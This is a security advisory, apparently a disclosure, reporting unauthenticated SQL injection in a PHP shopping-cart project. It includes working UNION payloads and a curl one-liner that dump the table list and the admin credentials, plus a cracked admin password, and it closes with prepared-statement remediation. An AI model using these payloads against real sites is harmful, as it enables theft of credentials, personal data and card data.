Description

online-shopping-system-advanced passes user-controlled POST and GET parameters directly into mysqli_query() calls without prepared statements or escaping across four public-facing endpoints. No authentication is required to reach any of these sinks.

> Primary sink — action.php:110 (getProduct branch)

if(isset($_POST["cid"])){
    $cat_id = $_POST["cid"];     // no sanitization
} else {
    $cat_id = $_POST["cat_id"];
}
$product_query = "SELECT * FROM products,categories WHERE product_cat = '$cat_id'
                  AND product_cat=cat_id LIMIT $start,$limit";
$run_query = mysqli_query($con, $product_query);
// result rendered directly into HTML (product title, category, price)

The getProduct POST parameter acts as trigger — the cid value is only passed through the exploitable branch when getProduct is set. The page branch (line 84) also interpolates $cid but only returns a row count, making it blind.

> Secondary sink — product.php:206

$product_id = $_GET['p'];
$product_query = "SELECT COUNT(*) AS count FROM reviews WHERE product_id='$product_id'";

Secondary sink — `checkout_process.php:36` — stores raw payment card data

$cardname   = $_POST["cardname"];
$cardnumber = $_POST["cardnumber"];
// ... all POST fields unsanitized ...
$sql = "INSERT INTO orders_info (..., cardname, cardnumber, ..., cvv)
        VALUES (..., '$cardname', '$cardnumber', ..., '$cvv')";

Proof of Concept

PoC 1 — UNION-based table enumeration via action.php

The products JOIN categories query returns 10 columns; column 10 (rendered as product category in .product-category) is the visible output slot.

POST /action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

getProduct=1&cid=0' UNION SELECT 1,2,3,4,5,6,7,8,9,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())-- -

> Verified response (.product-category element):

admin_info,brands,cart,categories,email_info,logs,order_products,orders,orders_info,products,reviews

PoC 2 — Admin credential dump

POST /action.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

getProduct=1&cid=0' UNION SELECT 1,2,3,4,5,6,7,8,9,(SELECT GROUP_CONCAT(admin_email,':',admin_password) FROM admin_info)-- -

> Verified response:

admin@gmail.com:25f9e794323b453885f5181f1b624d0b

The MD5 hash cracks to 123456789 via common wordlists.

PoC 3 — curl one-liner

curl -s -X POST http://TARGET/action.php \
  -d "getProduct=1&cid=0' UNION SELECT 1,2,3,4,5,6,7,8,9,(SELECT GROUP_CONCAT(admin_email,0x3a,admin_password) FROM admin_info)-- -" \
  | grep -oP "(?<=class='product-category'>)[^<]+"

Impact

An unauthenticated attacker can:

  • Dump all user PII (name, email, address, password hashes) from user_info
  • Dump admin credentials from admin_info and crack the MD5 hash offline
  • Dump raw payment card data (number, expiry, CVV) stored in orders_info
  • Achieve full database read/write access via additional injection points

Remediation

Replace all raw mysqli_query() calls with prepared statements:

$stmt = $con->prepare(
    "SELECT * FROM products,categories WHERE product_cat = ? AND product_cat=cat_id LIMIT ?,?"
);
$stmt->bind_param("sii", $_POST['cid'], $start, $limit);
$stmt->execute();
$result = $stmt->get_result();

Additionally, stop storing raw card data — delegate payment processing to a PCI-DSS-compliant provider and never persist full card numbers or CVV values.
